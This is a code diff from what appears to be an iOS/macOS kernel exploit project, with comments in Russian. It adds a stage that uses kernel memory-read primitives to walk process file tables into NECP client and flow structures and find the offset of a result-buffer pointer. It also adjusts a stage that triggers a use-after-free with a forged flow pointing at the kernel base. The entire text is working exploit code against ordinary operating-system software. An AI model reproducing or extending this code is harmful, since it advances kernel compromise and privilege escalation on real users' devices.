@@ -4115,6 +4115,64 @@ static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
         if (got) kpNecpRemoveFlow(fd, flowUUID);
     }
 
+    // Stage D: интроспекция ClearSword — РЕАЛЬНЫЙ layout flow. Гипотеза:
+    //     copy_result читает result-буфер по указателю В flow (не assigned_addr
+    //     напрямую — потому stage2 мимо). Снимаем оффсет этого указателя:
+    //     живой flow → copy_result (наполняет буфер) → читаем flow → чей
+    //     указатель указывает на буфер с контентом результата.
+    if (gPrimitives.kreadbuf) {
+        kpNote(r, @"  --- D: интроспекция necp flow через ClearSword ---");
+        uint8_t liveFlow[16];
+        if (kpNecpAddFlowRaw(fd, uuid, liveFlow) == 0) {
+            extern uint64_t kp_rc_kread64(uint64_t);
+            uint8_t *resD = calloc(1, KP_NECP_COPY_SZ);
+            long rd0 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)uuid, 16, resD, KP_NECP_COPY_SZ);
+            uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+            if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
+            uint64_t fdPtr = 0;
+            kpRead(selfProc + koffsetof(proc, fd), &fdPtr, 8, "proc.fd", r);
+            uint64_t fdTable = kp_untag_ptr(fdPtr);
+            uint64_t fpRaw = 0;
+            kpRead(fdTable + 0x28 + (uint64_t)fd * 8, &fpRaw, 8, "ofiles[fd]", r);
+            uint64_t fileprocVA = kp_untag_ptr(fpRaw);
+            uint64_t globRaw = 0, dataRaw = 0;
+            kpRead(fileprocVA + 0x10, &globRaw, 8, "fileproc.glob", r);
+            uint64_t globVA = kp_untag_ptr(globRaw);
+            kpRead(globVA + 0x38, &dataRaw, 8, "fileglob.data", r);
+            uint64_t clientVA = kp_untag_ptr(dataRaw);
+            kpNote(r, [NSString stringWithFormat:@"  D: fd=%d copy_result→%ld client=%#llx", fd, rd0, clientVA]);
+            if (kpLooksLikeKernelPointer(clientVA)) {
+                uint64_t flowVA = 0;
+                for (uint64_t o = 0; o < 0x400 && !flowVA; o += 8) {
+                    uint64_t v = kp_rc_kread64(clientVA + o);
+                    uint64_t u = kp_untag_ptr(v);
+                    if (!kpLooksLikeKernelPointer(u)) continue;
+                    uint8_t probe[0x60];
+                    kreadbuf(u, probe, sizeof probe);
+                    for (int so = 0; so <= (int)(sizeof probe) - 16; so += 8)
+                        if (!memcmp(probe + so, liveFlow, 16)) { flowVA = u; break; }
+                }
+                kpNote(r, [NSString stringWithFormat:@"  D: flow=%#llx (uuid найден: %@)", flowVA, flowVA ? @"да" : @"нет — flow глубже"]);
+                if (flowVA) {
+                    int shown = 0;
+                    for (uint64_t o = 0; o < 0x600 && shown < 48; o += 8) {
+                        uint64_t v = kp_rc_kread64(flowVA + o);
+                        uint64_t u = kp_untag_ptr(v);
+                        if (!kpLooksLikeKernelPointer(u)) continue;
+                        uint8_t tgt[16];
+                        kreadbuf(u, tgt, 16);
+                        BOOL matchRes = (rd0 > 0 && !memcmp(tgt, resD, rd0 < 16 ? (size_t)rd0 : 16));
+                        kpNote(r, [NSString stringWithFormat:@"    flow+%#03llx → %#llx%@", (unsigned long long)o, u,
+                                      matchRes ? @"  ◄◄◄ RESULT BUF (контент совпал — ЭТО оффсет указателя!)" : @""]);
+                        shown++;
+                    }
+                }
+            }
+            kpNecpRemoveFlow(fd, liveFlow);
+            free(resD);
+        }
+    }
+
     // Stage 1: does copy_result return anything after remove? (dangling flow)
     {
         uint8_t fake[KP_NCF_BUF_SZ];
@@ -4152,8 +4210,10 @@ static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
         *(uint64_t *)(fake + KP_NCF_ASSIGNED_OFF) = kbase;
         *(uint64_t *)(fake + KP_NCF_ASSIGNED_LEN_OFF) = 0x40;
         uint8_t *res = calloc(1, KP_NECP_COPY_SZ);
-        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, 0x40, r);
-        kpNote(r, [NSString stringWithFormat:@"  stage2 (assigned=kernel base %#llx): copy_result → %ld", (unsigned long long)kbase, r3]);
+        errno = 0;
+        long r3 = kpNecpUafExecute(fd, uuid, fake, sizeof(fake), res, KP_NECP_COPY_SZ, r);
+        kpNote(r, [NSString stringWithFormat:@"  stage2 (assigned=kernel base %#llx): copy_result → %ld (errno=%d %@)",
+                     (unsigned long long)kbase, r3, errno, r3 < 0 ? [NSString stringWithFormat:@"(%s)", strerror(errno)] : @""]);
         if (r3 > 0) {
             uint32_t magic = 0;
             memcpy(&magic, res, 4);
